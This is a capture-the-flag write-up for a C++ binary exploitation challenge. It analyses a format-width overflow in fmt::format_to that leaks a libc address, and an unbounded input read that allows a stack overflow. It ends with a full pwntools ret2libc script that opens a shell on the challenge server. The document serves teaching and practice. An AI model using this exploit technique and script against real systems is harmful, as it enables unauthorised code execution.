The round 2 challenge was named plusplus and was a C++ challenge. The source was provided this time and the description read "_Everything is better in C++_"

### Code Analysis
Here's the provided source
```C++
// g++ -o plusplus plusplus.cxx -w -std=c++23 -lfmt -fno-stack-protector -fPIE

#define NDEBUG

#include <iostream>
#include <string.h>
#include <unistd.h>
#include <fmt/core.h>

#define MAX_BUF_SIZE 0x100
#define MAX_PRINT_SZ 0x50

__attribute__((constructor))
void __constructor__(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int safe_str_input(char *buffer, int size) {
    int sz = -1;
    while(buffer[sz] != '\n') { buffer[++sz] = getchar(); }
    buffer[sz] = 0;
    return sz;
}

int main() {
    // Run me once, shame on you. Run me twice, shame on me.
    char buf[MAX_BUF_SIZE];
    char buf_2[MAX_BUF_SIZE];
    snprintf(buf_2, MAX_BUF_SIZE, "%p", &setvbuf); // help-help-help
    char output[MAX_BUF_SIZE];

    memset(output, 0, MAX_BUF_SIZE);
    for(int i = 0; i < 2; ++i) {

        for(int j=0;j<=i;++j) std::cout << "+";
        std::cout << " ";
        if(safe_str_input(buf, MAX_BUF_SIZE) < 0) break;
        if(i) break;
        size_t sz = strlen(buf);
        if(sz <= 1) continue;
        buf[(sz >= MAX_BUF_SIZE) ? MAX_BUF_SIZE-1 : strcspn(buf, "\n")] = 0;
        fmt::format_to(output, fmt::runtime(buf), MAX_PRINT_SZ);
        std::cout << std::string(output) << std::endl;
    }

    return 0;
}
```

Looking at the code, we see that the program is running two nested loops. The outer loop runs twice and the inner loop runs equal to the outer-loop's counter times. It also places the address of `setvbuf` function in the buffer `buf_2`

In the first run of the outer loop, the inner loop will call the function `safe_str_input` on buffer `buf` with size `MAX_BUF_SIZE` (0x100) and then it will call `fmt::format_to`, our provided input as the `format` argument and the output being stored in `output` buffer and the output was printed on stdout. 
In second run of the outer loop, the inner loop will only call `safe_str_input` and terminate both the inner and outer loop and return from main.

Looking closely at the `safe_str_input` function, we observe that it will keep on reading characters from stdin and writing them into the provided buffer until it receives a newline. It doesn't perform any bounds check for the buffer. It shows behavior similar to the infamous `gets` function. The difference being that `gets` replaces the newline with a null byte but it adds a null-byte after the newline (which will then be replaced by a null byte in main function). Hence a buffer overflow can be caused.

Looking at the protections enabled (can be inferred from the compiler arguments given in the top comment), we find that PIE, Full RELRO and NX are enabled but canary is disabled.
This confirmed that buffer overflow was imminent.

### Exploitation
After finding the format string and buffer overflow vulnerabilities, I was looking for a leak to do a `ret2libc` attack. I thought we could leak the stack contents like we do in C `printf` format string attacks. I pulled up the C++ does for the `fmt::format_to` function and was reading the format string syntax. It uses a syntax similar to Python's `str.format` function.
I tried giving indices to read arguments beyond the provided one (still under the impression that it was similar to `printf` format string).

After attempting multiple indices and types (you can specify the type being printed in the format), the program wasn't letting me print any argument other than the first argument and that only in integer format. The issue was that C++ does runtime checks for verifying argument's indices and types with the ones that we provided during compilation, unlike `printf` that has no runtime checks because it has no runtime type information.

At this point the first hint was released, that read "_The format documentation is quite extensive. You just need to look into expansions_". Expansions are same as those of `printf`. We specify a width of the argument being printed and the value is padding with space (default) or the specified character from the left (default) or the right to make the string have the specified width.
Example expansions:
`printf`: `%<offset>$<width><specifier>`, `%2$20d`, `%20d`, `%-20s`
`fmt`: `{<offset>:<width><specifier>}`, `{2:20d}`, `{:20d}`, `{:-20s}`

With this in mind, I experimented with a few different widths and found out that there were no bound checks on the `output` buffer, so we can overflow `output` and `fmt` wasn't performing any string termination either. Looking at the stack in `gdb`, you get the following layout:
```
[output buffer]
[buf_2 buffer]
[buf buffer]
[saved rbp]
[return address]
```
This reminded me that there is a libc leak present in `buf_2`, I overflowed `output` with `{:256}` and got the following output:
```
+ {:256}
                                                                                                                                                                                                                                                              800x78ea92c88540
++
```
The address at the end is `setvbuf`. Now we have libc base and just need to perform buffer overflow in `buf` buffer, thanks to buffer overflow in `safe_str_input` function.
I did a simple `ret2libc` attack to execute `system` function

### Final Exploit
```py
#!/usr/bin/env python3
from pwn import *

def start() -> tube:
    if args.REMOTE:
        return remote("challs.airoverflow.com", 32297)
    else:
        return elf.process()
    
def attach_gdb() -> None:
    if args.REMOTE or args.NOGDB:
        return
    
    gdb.attach(p, '''
    b *main +730
    continue
               ''')
    input("ATTACHED?")

context.binary = elf = ELF("./plusplus_patched")
libc = elf.libc

POP_RDI = 0x000000000010f75b
RET = POP_RDI + 1
BIN_SH = 0x1cb42f

p = start()

p.sendlineafter("+ ", "{:256}")
libc_leak = int(p.recvline().strip()[2:], 0x10)

libc.address = libc_leak - libc.sym.setvbuf

print(hex(libc.address))

rop = [
    libc.address + POP_RDI, libc.address + BIN_SH,
    libc.address + RET,
    libc.sym.system
]

attach_gdb()

p.sendlineafter("++ ", b'A'*440 + b''.join([p64(x) for x in rop]))

p.interactive()
p.close()
```

### Comments
I really liked the idea of the challenge to show that format string are not limited to C's `printf` and can be helpful even with strict type-checking.